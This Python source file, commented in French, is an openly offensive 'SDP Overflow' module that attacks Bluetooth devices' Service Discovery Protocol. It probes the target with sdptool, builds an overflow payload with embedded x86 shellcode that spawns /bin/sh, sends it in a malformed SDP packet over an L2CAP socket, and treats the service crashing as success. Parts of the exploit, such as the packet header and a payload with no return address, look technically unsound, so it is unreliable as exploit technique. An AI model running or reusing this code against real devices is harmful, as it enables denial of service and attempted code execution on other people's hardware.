#!/usr/bin/env python3
"""
Module d'attaque SDP Overflow - Débordement de buffer sur le Service Discovery Protocol
"""

import subprocess
import socket
import struct
import time
from typing import Optional, Callable

class SDPOverflowAttack:
    def __init__(self, config: dict, callback: Optional[Callable] = None):
        self.config = config
        self.callback = callback
        self.running = False
        
    def execute(self, target_address: str, overflow_size: int = None) -> bool:
        """Exécuter l'attaque SDP Overflow"""
        try:
            self.running = True
            self._log("Démarrage de l'attaque SDP Overflow...", "info")
            
            # Taille de débordement par défaut
            if not overflow_size:
                overflow_size = self.config.get('overflow_size', 2048)
                
            # Vérifier la vulnérabilité SDP
            if not self._check_sdp_vulnerability(target_address):
                self._log("Cible non vulnérable au SDP Overflow", "warning")
                return False
                
            # Créer le payload de débordement
            overflow_payload = self._create_overflow_payload(overflow_size)
            
            # Envoyer le payload via SDP
            if self._send_sdp_overflow(target_address, overflow_payload):
                self._log("SDP Overflow envoyé avec succès!", "success")
                
                # Vérifier l'effet de l'attaque
                if self._verify_overflow_effect(target_address):
                    self._log("Débordement confirmé - Attaque réussie!", "success")
                    return True
                else:
                    self._log("Débordement non confirmé", "warning")
                    return False
            else:
                self._log("Échec de l'envoi du SDP Overflow", "error")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'attaque SDP Overflow: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_sdp_vulnerability(self, target_address: str) -> bool:
        """Vérifier si la cible est vulnérable au SDP Overflow"""
        try:
            self._log("Vérification de la vulnérabilité SDP...", "info")
            
            # Vérifier si SDP est accessible
            cmd = ['sdptool', 'browse', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                self._log("Service SDP accessible", "info")
                return True
            else:
                self._log("Service SDP non accessible", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification SDP: {e}", "error")
            return False
            
    def _create_overflow_payload(self, size: int) -> bytes:
        """Créer un payload de débordement"""
        try:
            self._log(f"Création du payload de débordement ({size} octets)...", "info")
            
            # Pattern pour identifier l'offset
            pattern = b''
            for i in range(0, size, 4):
                pattern += struct.pack('<I', i)
                
            # Ajouter des données malveillantes
            shellcode = self._create_shellcode()
            
            # Construire le payload complet
            payload = pattern[:size - len(shellcode)]
            payload += shellcode
            
            # S'assurer que la taille est correcte
            if len(payload) > size:
                payload = payload[:size]
            elif len(payload) < size:
                payload += b'\x90' * (size - len(payload))
                
            return payload
            
        except Exception as e:
            self._log(f"Erreur lors de la création du payload: {e}", "error")
            return b'A' * size
            
    def _create_shellcode(self) -> bytes:
        """Créer un shellcode pour l'exploitation"""
        # Shellcode Linux x86 pour exécuter /bin/sh
        shellcode = (
            b'\x31\xc0'          # xor eax, eax
            b'\x50'              # push eax
            b'\x68\x2f\x2f\x73\x68'  # push "//sh"
            b'\x68\x2f\x62\x69\x6e'  # push "/bin"
            b'\x89\xe3'          # mov ebx, esp
            b'\x50'              # push eax
            b'\x53'              # push ebx
            b'\x89\xe1'          # mov ecx, esp
            b'\xb0\x0b'          # mov al, 11
            b'\xcd\x80'          # int 0x80
        )
        
        return shellcode
        
    def _send_sdp_overflow(self, target_address: str, payload: bytes) -> bool:
        """Envoyer le payload de débordement via SDP"""
        try:
            self._log("Envoi du payload SDP Overflow...", "info")
            
            # Créer un socket L2CAP pour SDP
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            sock.settimeout(10)
            
            # Se connecter au port SDP (1)
            sock.connect((target_address, 1))
            
            # Créer le paquet SDP malveillant
            sdp_packet = self._create_sdp_packet(payload)
            
            # Envoyer le paquet
            sock.send(sdp_packet)
            
            # Attendre une réponse
            try:
                response = sock.recv(1024)
                if response:
                    self._log(f"Réponse SDP reçue: {len(response)} octets", "info")
            except socket.timeout:
                self._log("Aucune réponse SDP", "warning")
                
            sock.close()
            return True
            
        except socket.error as e:
            self._log(f"Erreur socket SDP: {e}", "error")
            return False
        except Exception as e:
            self._log(f"Erreur lors de l'envoi SDP: {e}", "error")
            return False
            
    def _create_sdp_packet(self, payload: bytes) -> bytes:
        """Créer un paquet SDP malveillant"""
        # Header SDP
        packet = b'\x02'  # SDP PDU Type (Service Search Request)
        packet += struct.pack('>H', len(payload) + 4)  # Transaction ID
        packet += struct.pack('>H', len(payload))  # Parameter Length
        
        # Données de débordement
        packet += payload
        
        return packet
        
    def _verify_overflow_effect(self, target_address: str) -> bool:
        """Vérifier l'effet du débordement"""
        try:
            self._log("Vérification de l'effet du débordement...", "info")
            
            # Attendre un peu pour que l'effet se manifeste
            time.sleep(2)
            
            # Essayer de se reconnecter au SDP
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
                sock.settimeout(5)
                sock.connect((target_address, 1))
                
                # Envoyer une requête SDP normale
                normal_request = b'\x02\x00\x01\x00\x00\x00\x01'
                sock.send(normal_request)
                
                try:
                    response = sock.recv(1024)
                    if not response:
                        self._log("SDP ne répond plus - débordement confirmé", "success")
                        sock.close()
                        return True
                except socket.timeout:
                    self._log("SDP timeout - débordement probable", "success")
                    sock.close()
                    return True
                    
                sock.close()
                
            except socket.error:
                self._log("Impossible de se reconnecter - débordement confirmé", "success")
                return True
                
            return False
            
        except Exception as e:
            self._log(f"Erreur lors de la vérification: {e}", "error")
            return False
            
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
